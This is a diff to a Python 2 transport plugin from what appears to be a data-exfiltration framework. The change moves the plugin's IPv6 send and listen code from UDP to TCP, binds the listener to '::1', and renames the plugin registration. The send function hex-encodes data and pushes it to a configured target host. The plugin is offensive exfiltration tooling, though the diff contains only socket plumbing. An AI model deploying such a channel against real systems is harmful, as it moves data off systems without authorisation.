@@ -2,6 +2,9 @@ import socket
 import sys
 from random import choice
 
+if not socket.has_ipv6:
+    raise Exception("the local machine has no IPv6 support enabled")
+
 config = None
 app_exfiltrate = None
 
@@ -14,7 +17,7 @@ def send(data):
     port = config['port']
     app_exfiltrate.log_message(
         'info', "[tcp_ipv6] Sending {0} bytes to {1}".format(len(data), target))
-    client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+    client_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     client_socket.connect((target, port))
     client_socket.send(data.encode('hex'))
     client_socket.close()
@@ -25,34 +28,19 @@ def listen():
 
 def sniff(handler):
     port = config['port']
-    host = '::'
-    res = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM, 0, socket.AI_PASSIVE)
-    af, socktype, proto, canonname, sa = res[0]
-    try:
-        # server_address = ('', port)
-        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
-        sock.bind(sa)
-        # sock.bind(server_address)
-        app_exfiltrate.log_message(
-            'info', "[tcp_ipv6] Starting server on port {}...".format(port))
-        # sock.listen(1)
-    except Exception, e:
-        app_exfiltrate.log_message(
-            'warning', "[tcp_ipv6] Couldn't bind on port {}...".format(port))
-        sys.exit(-1)
-
+    server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+    sockaddr = ('::1', port)
+    server_socket.bind(sockaddr)
+    server_socket.listen(1)
+    app_exfiltrate.log_message('info', "[tcp_ipv6] Starting server on interface '::1' and port {}...".format(port))
     while True:
-        data, client_address = sock.recvfrom(4096)
-        app_exfiltrate.log_message('info', "[tcp_ipv6] client connected: {}".format(client_address))
-        if not data:
-            break
-        try:
-            app_exfiltrate.log_message('info', "[tcp_ipv6] Received {} bytes".format(len(data)))
-            handler(data.decode('hex'))
-        except Exception, e:
-            pass
-    sock.close()
-
+        conn, addr = server_socket.accept()
+        # print ('Server: Connected by', addr)
+        app_exfiltrate.log_message('info', "[tcp_ipv6] Client {} connected and sending data...".format(addr))
+        data = conn.recv(4096)
+        handler(data.decode('hex'))
+        conn.send(data)
+        conn.close()
 
 def relay_tcp_packet(data):
     target = config['target']
@@ -75,4 +63,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('tcp', {'send': send, 'listen': listen, 'proxy': proxy})
+        app.register_plugin('tcp_ipv6', {'send': send, 'listen': listen, 'proxy': proxy})
